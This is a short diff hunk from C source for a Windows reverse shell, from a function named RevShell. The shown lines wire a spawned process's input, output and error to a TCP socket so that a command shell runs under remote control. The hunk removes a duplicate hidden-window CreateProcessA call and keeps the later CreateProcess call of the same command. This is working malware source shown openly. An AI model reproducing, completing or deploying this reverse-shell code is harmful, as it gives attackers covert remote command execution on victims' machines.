@@ -68,7 +68,6 @@ void RevShell(void){
 	startupinfo.hStdInput = (HANDLE)tcpsock;
 	startupinfo.hStdOutput = (HANDLE)tcpsock;
 	startupinfo.hStdError = (HANDLE)tcpsock;
-	CreateProcessA(NULL, cmdpath, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &startupinfo, &processinfo);
 	
 	// process start
 	if (CreateProcess(NULL, cmdpath, NULL, NULL, TRUE, 0, NULL, NULL, &startupinfo, &processinfo) == 0){
